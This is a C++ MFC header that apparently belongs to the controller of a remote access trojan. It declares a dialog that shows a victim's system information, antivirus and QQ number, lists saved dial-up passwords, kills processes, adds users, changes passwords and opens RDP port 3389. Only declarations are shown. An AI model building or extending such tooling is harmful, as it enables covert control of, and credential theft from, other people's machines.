#if !defined(AFX_SYSTEMDLG_H__BCB8E53A_4673_471B_81DE_07D0D7E9C460__INCLUDED_)
#define AFX_SYSTEMDLG_H__BCB8E53A_4673_471B_81DE_07D0D7E9C460__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000
// SystemDlg.h : header file
//

/////////////////////////////////////////////////////////////////////////////
// CSystemDlg dialog



//信息列表结构体
struct tagSystemInfo
{
	char szCpuInfo[50];   //CPU信息
	char szActiveTime[100]; //活动时间
	char szAntiVirus[50]; //杀毒软件
	char szUserName[50];   //当前用户名
	char szPcName[50];  //计算机名
	char szRemotePort[10]; //远程端口
	DWORD szMemory;         //内存大小 
	DWORD szMemoryFree;     //可用内存 
	DWORD szDriveSize;      //硬盘大小
	DWORD szDriveFreeSize;  //可用硬盘大小
	char szOpenInfo[50];	// 是否双开(是否开启)
	char szDLLPath[MAX_PATH];    // 服务端路径
	char szScrxy[20];
	char szQQNum[100];
	int             nAddres;
	char            szAddress[50];
};

class CSystemDlg : public CDialog
{
// Construction 
public:
	CSystemDlg(CWnd* pParent = NULL, CIOCPServer* pIOCPServer = NULL, ClientContext *pContext = NULL);   // standard constructor
	void OnReceiveComplete();
    CImageList m_ImageList;
    static void SetClipboardText(CString &Data);

// Dialog Data
	//{{AFX_DATA(CSystemDlg)
	enum { IDD = IDD_DIALOG_SYSTEM };
	CXTPListCtrl	m_list;
	CXTPTabCtrl	m_tab;
	CString	m_admin;
	CString	m_net_pass;
	CString	m_net_user;
	//}}AFX_DATA
	CXTPHeaderCtrl   m_header;

// Overrides
	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CSystemDlg)
	public:
	virtual BOOL PreTranslateMessage(MSG* pMsg);
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	virtual void PostNcDestroy();
	//}}AFX_VIRTUAL

// Implementation
protected:
	CXTPStatusBar m_wndStatusBar;
    CIniFile	m_IniFile;
	HICON m_hIcon;
	ClientContext* m_pContext;
	CIOCPServer* m_iocpServer;
	CString IPAddress;
	UINT nRemotePort;

	DWORD dwMem;
	DWORD dwCpu;
	DWORD dwPrs;
	// Generated message map functions
	//{{AFX_MSG(CSystemDlg)
	virtual BOOL OnInitDialog();
	afx_msg void OnClose();
	afx_msg void OnSize(UINT nType, int cx, int cy);
	afx_msg void OnSelchangeTab(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnMenuitemKillprocess();
	afx_msg void KillprocessDel(BYTE Buffer ,char *strbuf);
	afx_msg void OnMenuitemRefreshSlist();
	afx_msg void OnRclickList(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnMenuitemCopy();
	afx_msg void OnMenuitemWindowRestored();
	afx_msg void OnMenuitemWindowHide();
	afx_msg void OnMenuitemWindowClose();
	afx_msg void OnMenuitemWindowMax();
	afx_msg void OnMenuitemWindowMin();
	afx_msg void OnMenuitemKillanddel();
	afx_msg void OnTimer(UINT nIDEvent);
	virtual void OnCancel();
	afx_msg void OnMenuitemActiveUser();
	afx_msg void OnMenuitemDisableUser();
	afx_msg void OnMenuitemAddUser();
	afx_msg void OnMenuitemChangePass();
	afx_msg void OnMenuitemDelUser();
	afx_msg void OnMenuitemDisconnectUser();
	afx_msg void OnMenuitemLogoffUser();
	afx_msg void OnButtonMstsc();
	afx_msg void OnButtonChanageport();
	afx_msg void OnButtonOpen3389();
	afx_msg void OnMenuitemSLogoff();
	afx_msg void OnMenuitemSReboot();
	afx_msg void OnMenuitemSShutdown();
	afx_msg void OnNetAdd();
	afx_msg void OnNetPreservations();   //保存修改
	DECLARE_MESSAGE_MAP()

	void ShowProcessList();
	void ShowWindowsList();
	void ShowDialupassList();
	void ShowSoftWareList();


	void GetProcessList();
	void GetWindowsList();
	void GetDialupassList();
	void GetSoftWareList();


	void GetSysInfoList();
	void GetSysUserList();
	void GetUserStateList();
	
	void ShowSysInfoList();
	void ShowSysUserList();
    void ShowUserStateList();
	

	void DeleteList();
	void ShowSelectWindow();
	void AdjustList();

	BOOL m_bOnClose;

	void OnChangeUser(UINT uState);
	void OnChangeUserState(UINT uState);
	void SendTermsrv_t();

};

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_SYSTEMDLG_H__BCB8E53A_4673_471B_81DE_07D0D7E9C460__INCLUDED_)
